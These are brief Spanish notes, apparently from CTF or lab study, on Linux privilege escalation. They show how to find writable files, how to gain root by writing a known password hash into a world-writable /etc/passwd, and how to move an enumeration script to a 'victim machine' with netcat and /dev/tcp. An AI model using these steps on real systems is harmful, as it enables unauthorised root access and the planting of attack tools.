Podemos buscar archivos por permisos:

```bash
find / -writable 2>/dev/null
```
_NOTA_: Con `grep -vE "archivo|idk"` -> Podemos eliminar lo q no queremos en el output.

Si vemos que /etc/passwd tiene `o+w`, podemos aprovecharnos de esto y reescribir la siguiente linea:

```bash
root:x:0:0:root:/root:/bin/bash
```

Cambiando _x_ por nuestra contrasena, por ejemplo, en _MD5_ y si hacemos `su root` y ponemos nuestra contrasena en texto plano -> entramos.

---
Hay herramientas muy buenas para _enumerar el sistema_:
https://github.com/diego-treitos/linux-smart-enumeration

```bash
wget "https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh"
```

A esto lo ofrecemos de nuestra maquina:
```bash
nc -nlvp 4444 < lse.sh
```

Y en la maquina victima:
```bash
cat < /dev/tcp/192.168.0.0/4444 > lse.sh
```

